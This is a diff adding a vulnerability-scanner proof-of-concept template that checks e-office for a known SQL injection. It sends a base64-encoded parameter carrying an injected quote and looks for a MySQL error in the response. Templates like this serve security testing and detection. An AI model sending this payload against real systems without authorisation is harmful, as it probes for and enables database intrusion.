@@ -1,0 +1,12 @@
+name: poc-yaml-eoffice-wooyun-2015-0128007-sqli
+rules:
+  - method: GET
+    path: >-
+      /inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxJ10=
+    follow_redirects: false
+    expression: >
+      response.body.bcontains(b"<b>Warning</b>") &&
+      response.body.bcontains(b"mysql_fetch_array():")
+detail:
+  links:
+    - https://www.uedbox.com/post/19675/
